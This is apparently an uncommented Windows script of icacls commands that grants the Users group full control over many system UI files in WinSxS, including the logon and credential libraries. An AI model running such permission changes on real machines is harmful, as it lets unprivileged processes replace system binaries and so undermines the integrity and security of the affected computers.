icacls "C:\Windows\WinSxS\amd64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_10c05ec783812334\f\Windows.UI.winmd" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_10c05ec783812334\f\Windows.UI.Xaml.winmd" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_10c05ec783812334\r\Windows.UI.winmd" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_10c05ec783812334\r\Windows.UI.Xaml.winmd" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-s..dminflows.resources_31bf3856ad364e35_10.0.22621.2506_en-us_e1e22d452a6cded4\Windows.UI.SettingsAdminFlowUIThreshold.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-s..dminflows.resources_31bf3856ad364e35_10.0.22621.2506_en-us_e1e22d452a6cded4\f\Windows.UI.SettingsAdminFlowUIThreshold.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-s..dminflows.resources_31bf3856ad364e35_10.0.22621.2506_en-us_e1e22d452a6cded4\r\Windows.UI.SettingsAdminFlowUIThreshold.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-s..hreshold-adminflows_31bf3856ad364e35_10.0.22621.2792_none_007a421b998a317a\Windows.UI.SettingsAdminFlowUIThreshold.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-s..hreshold-adminflows_31bf3856ad364e35_10.0.22621.2792_none_007a421b998a317a\f\Windows.UI.SettingsAdminFlowUIThreshold.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-s..hreshold-adminflows_31bf3856ad364e35_10.0.22621.2792_none_007a421b998a317a\r\Windows.UI.SettingsAdminFlowUIThreshold.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-s..ink-inkanalysiscore_31bf3856ad364e35_10.0.22621.1_none_aa7c9c53ef1e6cd6\Windows.UI.Input.Inking.Analysis.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-s..ncehost.shellcommon_31bf3856ad364e35_10.0.22621.3007_none_28d3419fd1260c93\Windows.UI.ActionCenter.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-s..ncehost.shellcommon_31bf3856ad364e35_10.0.22621.3007_none_28d3419fd1260c93\Windows.UI.QuickActions.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-s..ncehost.shellcommon_31bf3856ad364e35_10.0.22621.3007_none_28d3419fd1260c93\f\Windows.UI.ActionCenter.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-s..ncehost.shellcommon_31bf3856ad364e35_10.0.22621.3007_none_28d3419fd1260c93\f\Windows.UI.QuickActions.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-s..ncehost.shellcommon_31bf3856ad364e35_10.0.22621.3007_none_28d3419fd1260c93\r\Windows.UI.ActionCenter.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-s..ncehost.shellcommon_31bf3856ad364e35_10.0.22621.3007_none_28d3419fd1260c93\r\Windows.UI.QuickActions.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-s..ndlers-nt.resources_31bf3856ad364e35_10.0.22621.2506_en-us_e1c191afd8d8f6e6\Windows.UI.SettingsHandlers-nt.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-s..ndlers-nt.resources_31bf3856ad364e35_10.0.22621.2506_en-us_e1c191afd8d8f6e6\f\Windows.UI.SettingsHandlers-nt.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-s..ndlers-nt.resources_31bf3856ad364e35_10.0.22621.2506_en-us_e1c191afd8d8f6e6\r\Windows.UI.SettingsHandlers-nt.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-s..ndlers-nt.resources_31bf3856ad364e35_10.0.22621.3007_en-us_e1f78c69d8b081f9\Windows.UI.SettingsHandlers-nt.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-s..ndlers-nt.resources_31bf3856ad364e35_10.0.22621.3007_en-us_e1f78c69d8b081f9\f\Windows.UI.SettingsHandlers-nt.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-s..ndlers-nt.resources_31bf3856ad364e35_10.0.22621.3007_en-us_e1f78c69d8b081f9\r\Windows.UI.SettingsHandlers-nt.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-s..riencehost.appxmain_31bf3856ad364e35_10.0.22621.2792_none_dca88e457a95c152\Windows.UI.SoftLanding.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-s..riencehost.appxmain_31bf3856ad364e35_10.0.22621.2792_none_dca88e457a95c152\f\Windows.UI.SoftLanding.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-s..riencehost.appxmain_31bf3856ad364e35_10.0.22621.2792_none_dca88e457a95c152\r\Windows.UI.SoftLanding.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-s..settingshandlers-nt_31bf3856ad364e35_10.0.22621.3007_none_5df6ee22ce8e78a0\Windows.UI.SettingsHandlers-nt.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-s..settingshandlers-nt_31bf3856ad364e35_10.0.22621.3007_none_5df6ee22ce8e78a0\f\Windows.UI.SettingsHandlers-nt.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-s..settingshandlers-nt_31bf3856ad364e35_10.0.22621.3007_none_5df6ee22ce8e78a0\r\Windows.UI.SettingsHandlers-nt.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-u..-controls.resources_31bf3856ad364e35_10.0.22621.1_en-us_4a382a521107e8b6\Windows.UI.Xaml.Controls.dll.mui" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-u..aml-phone.resources_31bf3856ad364e35_10.0.22621.1_en-us_c478a37645904f0a\Windows.UI.Xaml.Phone.dll.mui" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-u..d-library.resources_31bf3856ad364e35_10.0.22621.2506_en-us_c6de915a33bca65f\Windows.UI.Cred.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-u..eexplorer.resources_31bf3856ad364e35_10.0.22621.2506_en-us_ef0f04b04bf96d70\Windows.UI.FileExplorer.dll.mui" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-u..eexplorer.resources_31bf3856ad364e35_10.0.22621.2506_en-us_ef0f04b04bf96d70\f\Windows.UI.FileExplorer.dll.mui" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-u..eexplorer.resources_31bf3856ad364e35_10.0.22621.2506_en-us_ef0f04b04bf96d70\r\Windows.UI.FileExplorer.dll.mui" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-u..ell-sharedutilities_31bf3856ad364e35_10.0.22621.2506_none_ab1f68bc85f79f90\Windows.UI.Shell.SharedUtilities.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-u..ell-sharedutilities_31bf3856ad364e35_10.0.22621.2506_none_ab1f68bc85f79f90\f\Windows.UI.Shell.SharedUtilities.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-u..ell-sharedutilities_31bf3856ad364e35_10.0.22621.2506_none_ab1f68bc85f79f90\r\Windows.UI.Shell.SharedUtilities.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-u..ernal-adaptivecards_31bf3856ad364e35_10.0.22621.1_none_1eb104dda2fe5c9c\Windows.UI.Shell.Internal.AdaptiveCards.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-u..k-library.resources_31bf3856ad364e35_10.0.22621.2506_en-us_969c6f85b7434b5e\Windows.UI.BioFeedback.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-u..kcontrols.resources_31bf3856ad364e35_10.0.22621.1_en-us_b938c9fb614fcd56\Windows.UI.Xaml.InkControls.dll.mui" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-u..kedshutdown-library_31bf3856ad364e35_10.0.22621.1_none_f9c77629fd98bf20\Windows.UI.BlockedShutdown.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-u..kedshutdown-library_31bf3856ad364e35_10.0.22621.1_none_f9c77629fd98bf20\Windows.UI.BlockedShutdown.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-u..n-desktop.resources_31bf3856ad364e35_10.0.22621.2506_en-us_19c3fe1a523589c3\Windows.UI.ShellCommon.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-u..n-desktop.resources_31bf3856ad364e35_10.0.22621.2506_en-us_19c3fe1a523589c3\f\Windows.UI.ShellCommon.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-u..n-desktop.resources_31bf3856ad364e35_10.0.22621.2506_en-us_19c3fe1a523589c3\r\Windows.UI.ShellCommon.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-u..n-desktop.resources_31bf3856ad364e35_10.0.22621.3007_en-us_19f9f8d4520d14d6\Windows.UI.ShellCommon.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-u..n-desktop.resources_31bf3856ad364e35_10.0.22621.3007_en-us_19f9f8d4520d14d6\f\Windows.UI.ShellCommon.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-u..n-desktop.resources_31bf3856ad364e35_10.0.22621.3007_en-us_19f9f8d4520d14d6\r\Windows.UI.ShellCommon.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-u..n-library.resources_31bf3856ad364e35_10.0.22621.2506_en-us_2955f18be12a2ca3\Windows.UI.BlockedShutdown.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-u..n-library.resources_31bf3856ad364e35_10.0.22621.2506_en-us_f3baf1b955d1bb4c\Windows.UI.Logon.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-u..n-library.resources_31bf3856ad364e35_10.0.22621.2506_en-us_f3baf1b955d1bb4c\f\Windows.UI.Logon.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-u..n-library.resources_31bf3856ad364e35_10.0.22621.2506_en-us_f3baf1b955d1bb4c\r\Windows.UI.Logon.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-u..ninetcore.resources_31bf3856ad364e35_10.0.22621.2506_en-us_8ef2b2082a8472af\Windows.UI.ShellCommonInetCore.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-u..rer-wasdk.resources_31bf3856ad364e35_10.0.22621.2506_en-us_56685fb6d5165a87\Windows.UI.FileExplorer.WASDK.dll.mui" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-u..rer-wasdk.resources_31bf3856ad364e35_10.0.22621.2506_en-us_56685fb6d5165a87\n\Windows.UI.FileExplorer.WASDK.dll.mui" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-biofeedback-library_31bf3856ad364e35_10.0.22621.2506_none_e1e315c2bb4a5883\Windows.UI.BioFeedback.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-biofeedback-library_31bf3856ad364e35_10.0.22621.2506_none_e1e315c2bb4a5883\Windows.UI.BioFeedback.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-biofeedback-library_31bf3856ad364e35_10.0.22621.2506_none_e1e315c2bb4a5883\f\Windows.UI.BioFeedback.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-biofeedback-library_31bf3856ad364e35_10.0.22621.2506_none_e1e315c2bb4a5883\f\Windows.UI.BioFeedback.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-biofeedback-library_31bf3856ad364e35_10.0.22621.2506_none_e1e315c2bb4a5883\r\Windows.UI.BioFeedback.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-biofeedback-library_31bf3856ad364e35_10.0.22621.2506_none_e1e315c2bb4a5883\r\Windows.UI.BioFeedback.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-cred-library_31bf3856ad364e35_10.0.22621.2506_none_9f29ab110e06bc1c\Windows.UI.Cred.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-cred-library_31bf3856ad364e35_10.0.22621.2506_none_9f29ab110e06bc1c\Windows.UI.Cred.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-cred-library_31bf3856ad364e35_10.0.22621.2506_none_9f29ab110e06bc1c\f\Windows.UI.Cred.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-cred-library_31bf3856ad364e35_10.0.22621.2506_none_9f29ab110e06bc1c\f\Windows.UI.Cred.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-cred-library_31bf3856ad364e35_10.0.22621.2506_none_9f29ab110e06bc1c\r\Windows.UI.Cred.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-cred-library_31bf3856ad364e35_10.0.22621.2506_none_9f29ab110e06bc1c\r\Windows.UI.Cred.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-fileexplorer-wasdk_31bf3856ad364e35_10.0.22621.2792_none_8bc301cff7ea5fd7\Windows.UI.FileExplorer.WASDK.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-fileexplorer-wasdk_31bf3856ad364e35_10.0.22621.2792_none_8bc301cff7ea5fd7\n\Windows.UI.FileExplorer.WASDK.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-fileexplorer_31bf3856ad364e35_10.0.22621.2792_none_66c262f616e1ff18\Windows.UI.FileExplorer.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-fileexplorer_31bf3856ad364e35_10.0.22621.2792_none_66c262f616e1ff18\f\Windows.UI.FileExplorer.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-fileexplorer_31bf3856ad364e35_10.0.22621.2792_none_66c262f616e1ff18\r\Windows.UI.FileExplorer.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-logon-library_31bf3856ad364e35_10.0.22621.2506_none_5d292d61c47d3419\Windows.UI.Logon.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-logon-library_31bf3856ad364e35_10.0.22621.2506_none_5d292d61c47d3419\Windows.UI.Logon.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-logon-library_31bf3856ad364e35_10.0.22621.2506_none_5d292d61c47d3419\f\Windows.UI.Logon.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-logon-library_31bf3856ad364e35_10.0.22621.2506_none_5d292d61c47d3419\f\Windows.UI.Logon.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-logon-library_31bf3856ad364e35_10.0.22621.2506_none_5d292d61c47d3419\r\Windows.UI.Logon.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-logon-library_31bf3856ad364e35_10.0.22621.2506_none_5d292d61c47d3419\r\Windows.UI.Logon.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-networkuxcontroller_31bf3856ad364e35_10.0.22621.2506_none_bf3cfb1b5174d0e9\Windows.UI.NetworkUXController.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-networkuxcontroller_31bf3856ad364e35_10.0.22621.2506_none_bf3cfb1b5174d0e9\f\Windows.UI.NetworkUXController.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-networkuxcontroller_31bf3856ad364e35_10.0.22621.2506_none_bf3cfb1b5174d0e9\r\Windows.UI.NetworkUXController.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-pcshell.resources_31bf3856ad364e35_10.0.22621.2506_en-us_36c82c63af13c34e\Windows.UI.PCShell.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-pcshell.resources_31bf3856ad364e35_10.0.22621.2506_en-us_36c82c63af13c34e\f\Windows.UI.PCShell.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-pcshell.resources_31bf3856ad364e35_10.0.22621.2506_en-us_36c82c63af13c34e\r\Windows.UI.PCShell.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-pcshell_31bf3856ad364e35_10.0.22621.2506_none_f47919e5326ec241\Windows.UI.PCShell.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-pcshell_31bf3856ad364e35_10.0.22621.2506_none_f47919e5326ec241\f\Windows.UI.PCShell.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-pcshell_31bf3856ad364e35_10.0.22621.2506_none_f47919e5326ec241\r\Windows.UI.PCShell.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-search.resources_31bf3856ad364e35_10.0.22621.2506_en-us_53839e6ae9c220a9\Windows.UI.Search.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-search_31bf3856ad364e35_10.0.22621.2506_none_d4eb9eca9ea17ee2\Windows.UI.Search.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-search_31bf3856ad364e35_10.0.22621.2506_none_d4eb9eca9ea17ee2\Windows.UI.Search.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-search_31bf3856ad364e35_10.0.22621.2506_none_d4eb9eca9ea17ee2\f\Windows.UI.Search.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-search_31bf3856ad364e35_10.0.22621.2506_none_d4eb9eca9ea17ee2\r\Windows.UI.Search.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shell-component_31bf3856ad364e35_10.0.22621.2506_none_2d7be6f886278ad2\Windows.UI.Shell.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shell-component_31bf3856ad364e35_10.0.22621.2506_none_2d7be6f886278ad2\Windows.UI.Shell.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shell-component_31bf3856ad364e35_10.0.22621.2506_none_2d7be6f886278ad2\f\Windows.UI.Shell.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shell-component_31bf3856ad364e35_10.0.22621.2506_none_2d7be6f886278ad2\r\Windows.UI.Shell.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shell.resources_31bf3856ad364e35_10.0.22621.2506_en-us_902c5810061b8c5d\Windows.UI.Shell.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shellcommon-desktop_31bf3856ad364e35_10.0.22621.3007_none_b47b6d8e2e44587f\Windows.UI.ShellCommon.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shellcommon-desktop_31bf3856ad364e35_10.0.22621.3007_none_b47b6d8e2e44587f\f\Windows.UI.ShellCommon.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shellcommon-desktop_31bf3856ad364e35_10.0.22621.3007_none_b47b6d8e2e44587f\r\Windows.UI.ShellCommon.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shellcommoninetcore_31bf3856ad364e35_10.0.22621.2506_none_9b69ece04f913aaa\Windows.UI.ShellCommonInetCore.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shellcommoninetcore_31bf3856ad364e35_10.0.22621.2506_none_9b69ece04f913aaa\f\Windows.UI.ShellCommonInetCore.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shellcommoninetcore_31bf3856ad364e35_10.0.22621.2506_none_9b69ece04f913aaa\r\Windows.UI.ShellCommonInetCore.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-storage_31bf3856ad364e35_10.0.22621.2506_none_e5a060a9cdacb713\Windows.UI.Storage.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-storage_31bf3856ad364e35_10.0.22621.2506_none_e5a060a9cdacb713\f\Windows.UI.Storage.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-storage_31bf3856ad364e35_10.0.22621.2506_none_e5a060a9cdacb713\r\Windows.UI.Storage.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-controls_31bf3856ad364e35_10.0.22621.2506_none_f5b704df59c615b7\Windows.UI.Xaml.Controls.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-controls_31bf3856ad364e35_10.0.22621.2506_none_f5b704df59c615b7\f\Windows.UI.Xaml.Controls.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-controls_31bf3856ad364e35_10.0.22621.2506_none_f5b704df59c615b7\r\Windows.UI.Xaml.Controls.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-inkcontrols_31bf3856ad364e35_10.0.22621.2506_none_ae300763e04f821d\Windows.UI.Xaml.InkControls.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-inkcontrols_31bf3856ad364e35_10.0.22621.2506_none_ae300763e04f821d\f\Windows.UI.Xaml.InkControls.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-inkcontrols_31bf3856ad364e35_10.0.22621.2506_none_ae300763e04f821d\r\Windows.UI.Xaml.InkControls.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-maps.resources_31bf3856ad364e35_10.0.22621.1_en-us_a34843c4f40c8799\Windows.UI.Xaml.Maps.dll.mui" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-maps_31bf3856ad364e35_10.0.22621.2506_none_772812a545bd707a\Windows.UI.Xaml.Maps.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-maps_31bf3856ad364e35_10.0.22621.2506_none_772812a545bd707a\f\Windows.UI.Xaml.Maps.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-maps_31bf3856ad364e35_10.0.22621.2506_none_772812a545bd707a\r\Windows.UI.Xaml.Maps.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-phone_31bf3856ad364e35_10.0.22621.2506_none_b080ca702ba5ac7d\Windows.UI.Xaml.Phone.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-phone_31bf3856ad364e35_10.0.22621.2506_none_b080ca702ba5ac7d\f\Windows.UI.Xaml.Phone.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-phone_31bf3856ad364e35_10.0.22621.2506_none_b080ca702ba5ac7d\r\Windows.UI.Xaml.Phone.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-w..immersive.resources_31bf3856ad364e35_10.0.22621.1_en-us_ebb4f7a537d3cc0c\Windows.UI.Immersive.dll.mui" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-w..indowsuiinputinking_31bf3856ad364e35_10.0.22621.2506_none_cf48f5365ec60bd3\Windows.UI.Input.Inking.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-w..indowsuiinputinking_31bf3856ad364e35_10.0.22621.2506_none_cf48f5365ec60bd3\f\Windows.UI.Input.Inking.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-w..indowsuiinputinking_31bf3856ad364e35_10.0.22621.2506_none_cf48f5365ec60bd3\r\Windows.UI.Input.Inking.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-w..putinking.resources_31bf3856ad364e35_10.0.22621.1_en-us_0f4d763dda2a0a70\Windows.UI.Input.Inking.dll.mui" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-windowsuiimmersive_31bf3856ad364e35_10.0.22621.2506_none_11aa38b84fa8c6d1\Windows.UI.Immersive.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-windowsuiimmersive_31bf3856ad364e35_10.0.22621.2506_none_11aa38b84fa8c6d1\Windows.UI.Immersive.dll.mun" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-windowsuiimmersive_31bf3856ad364e35_10.0.22621.2506_none_11aa38b84fa8c6d1\f\Windows.UI.Immersive.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-windowsuiimmersive_31bf3856ad364e35_10.0.22621.2506_none_11aa38b84fa8c6d1\f\Windows.UI.Immersive.dll.mun" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-windowsuiimmersive_31bf3856ad364e35_10.0.22621.2506_none_11aa38b84fa8c6d1\r\Windows.UI.Immersive.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-windowsuiimmersive_31bf3856ad364e35_10.0.22621.2506_none_11aa38b84fa8c6d1\r\Windows.UI.Immersive.dll.mun" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-windowui.resources_31bf3856ad364e35_10.0.22621.1_en-us_311dc6dfeedd4ea4\Windows.UI.dll.mui" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-windowui_31bf3856ad364e35_10.0.22621.2506_none_e7248d3d5f352b03\Windows.UI.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-windowui_31bf3856ad364e35_10.0.22621.2506_none_e7248d3d5f352b03\f\Windows.UI.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-windowui_31bf3856ad364e35_10.0.22621.2506_none_e7248d3d5f352b03\r\Windows.UI.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-xamlhost-library_31bf3856ad364e35_10.0.22621.2506_none_4fc099f70cad6205\Windows.UI.XamlHost.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-xamlhost-library_31bf3856ad364e35_10.0.22621.2506_none_4fc099f70cad6205\f\Windows.UI.XamlHost.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-xamlhost-library_31bf3856ad364e35_10.0.22621.2506_none_4fc099f70cad6205\r\Windows.UI.XamlHost.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_systemresource-wind..-ui-accountscontrol_31bf3856ad364e35_10.0.22621.1_none_33aaad6b477ff550\Windows.UI.AccountsControl.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_systemresource-wind..tscontrol.resources_31bf3856ad364e35_10.0.22621.2506_en-us_49f7e5f780ab82cb\Windows.UI.AccountsControl.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-onecore-a..sibility-experience_31bf3856ad364e35_10.0.22621.2506_none_75f0813a36133fbb\Windows.UI.Accessibility.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\wow64_microsoft-onecore-a..sibility-experience_31bf3856ad364e35_10.0.22621.2506_none_75f0813a36133fbb\f\Windows.UI.Accessibility.dll" /t /Grant Users:F
